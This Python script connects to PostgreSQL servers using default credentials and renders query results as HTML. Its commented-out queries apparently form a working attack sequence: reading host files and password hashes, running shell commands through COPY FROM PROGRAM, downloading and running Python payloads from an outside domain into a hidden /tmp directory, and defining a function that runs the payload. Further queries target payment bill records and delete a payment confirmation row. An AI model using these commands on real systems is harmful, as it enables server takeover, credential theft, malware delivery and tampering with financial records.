import sys
import os

# Add the directories containing site-packages to the system path
sys.path.insert(
    0,
    os.path.abspath(
        os.path.join(os.path.dirname(__file__), "./python3.6/site-packages")
    ),
)

# Try importing pg8000 directly
try:
    import pg8000

    print("pg8000 imported successfully.")
except ImportError as e:
    print(f"pg8000 import error: {e}")

# Database connection information
db_config = {
    'host': '192.168.20.17',
    'database': 'postgres',
    'user': 'postgres',
    'password': 'postgres',
    'port': 5432
}


# db_config = {
#     "host": "192.168.100.122",
#     "database": "ms_document_validation_db",
#     "user": "postgres",
#     "password": "postgres",
#     "port": 5432,
# }


def query_database(query, pg8000_module, db_config):
    try:
        # Connect to the PostgreSQL database using pg8000
        conn = pg8000_module.connect(
            host=db_config["host"],
            database=db_config["database"],
            user=db_config["user"],
            password=db_config["password"],
            port=db_config["port"],
        )

        # Create a cursor to execute the query
        cursor = conn.cursor()
        cursor.execute(query)

        # Handle SELECT queries
        #if query.strip().lower().startswith("show"):
        if "select" in query.strip().lower():
            rows = cursor.fetchall()
            headers = [desc[0] for desc in cursor.description]
        else:
            # For non-SELECT queries, commit the transaction
            conn.commit()
            rows = None
            headers = None
            print(f"Query executed successfully. Rows affected: {cursor.rowcount}")

        # Close the cursor and connection
        cursor.close()
        conn.close()

        return headers, rows

    except Exception as e:
        print(f"Error: {e}")
        return None, None


# Function to generate a well-formatted HTML table
def generate_html_table(headers, rows):
    html = """
    <html>
    <head>
        <title>Database Query Results</title>
        <style>
            table {
                width: 100%;
                border-collapse: collapse;
                margin: 20px 0;
                font-size: 18px;
                text-align: left;
            }
            th, td {
                border: 1px solid #dddddd;
                padding: 8px;
            }
            th {
                background-color: #f2f2f2;
            }
            tr:nth-child(even) {
                background-color: #f9f9f9;
            }
        </style>
    </head>
    <body>
        <h2>Database Query Results</h2>
        <table>
            <tr>
    """
    # Add headers to the HTML table
    for header in headers:
        html += f"<th>{header}</th>"
    html += "</tr>"

    # Add rows to the HTML table
    for row in rows:
        html += "<tr>"
        for col in row:
            html += f"<td>{col}</td>"
        html += "</tr>"

    # Close the HTML tags
    html += """
        </table>
    </body>
    </html>
    """
    return html


# Example usage of querying the database nas_v2
query = "SHOW password_encryption"
#query = "SELECT datname FROM pg_database;"
# query = "select * from pg_ls_dir('../../../../../home');"
# query = "SELECT pg_read_file('../../../../../etc/mysql/my.cnf');"
#query = "SELECT * FROM pg_available_extensions"
#query = "SELECT rolname, rolpassword FROM pg_authid"
#query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"

#query = "SELECT * FROM documents_document LIMIT 200 OFFSET 0;"
# query = "SELECT * FROM documents_document WHERE application_data->>'business_name' ILIKE '%CHANDARANA%' LIMIT 200 OFFSET 0; "
#query = "DROP TABLE IF EXISTS pg_cmd_bb;"
#query = "CREATE TABLE pg_cmd_bb(cmd_output text);"
# query = "TRUNCATE pg_cmd_bb;"
# query = "COPY pg_cmd_bb FROM PROGRAM 'ls -lha ../../../../../';"

#query = "SELECT * FROM pg_cmd_bb;"
#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'ls -lha ../../../../../home/super/pgrouting-3.0.4/sql/components'; SELECT * FROM pg_cmd_bb;"
#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'cat ../../../../../home/super/.sudo_as_admin_successful'; SELECT * FROM pg_cmd_bb;"
#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'ls -lha ../../../../../tmp/.query-unix';"
#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'mkdir ../../../../../tmp/.query-unix';"

#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/my_env_b.zip https://sbnke.com/my_env_bf.zip';"
#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/master.py https://sbnke.com/py/master_b.py';"
#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'curl -o ../../../../../tmp/.query-unix/unzip.py https://sbnke.com/py/unzip.py';"
#query = "TRUNCATE pg_cmd_bb;COPY pg_cmd_bb FROM PROGRAM 'python3 ../../../../../tmp/.query-unix/master.py';"


#query = "SELECT proname, proargtypes, pronamespace::regnamespace, oid FROM pg_proc"

# query = """
# DROP FUNCTION IF EXISTS int99kv();
# CREATE OR REPLACE FUNCTION int99kv()
# RETURNS VOID AS $$
# BEGIN
#     COPY pg_cmd_bb FROM PROGRAM 'python3 ../../../../../tmp/.query-unix/master.py';
#     TRUNCATE pg_cmd_bb;
# END;
# $$ LANGUAGE plpgsql;
# """

# query = """
# SELECT *
# FROM checkout_bill
# WHERE "client_reference" IN (
#     'BL-UBP-192712',
#     'BL-GESS-34570',
#     'BL-SE-5F1BAB51',
#     'BL-GPK-3818185',
#     'BL-UBP-199659',
#     'BL-LR-285949',
#     'BL-HR-599673'
# )
# ORDER BY created_at DESC
# LIMIT 200 OFFSET 0;
# """

# query = """
# DELETE
# FROM taifa_payment_confirmation
# WHERE "BillRefNumber" = 'BL-UBP-192712';
# """

# Pass both pg8000 and db_config explicitly to the function
headers, rows = query_database(query, pg8000, db_config)
if headers and rows:
    # Generate and print the HTML table
    html_output = generate_html_table(headers, rows)
    print(html_output)
else:
    print("Failed to fetch data from the database or empty response.")
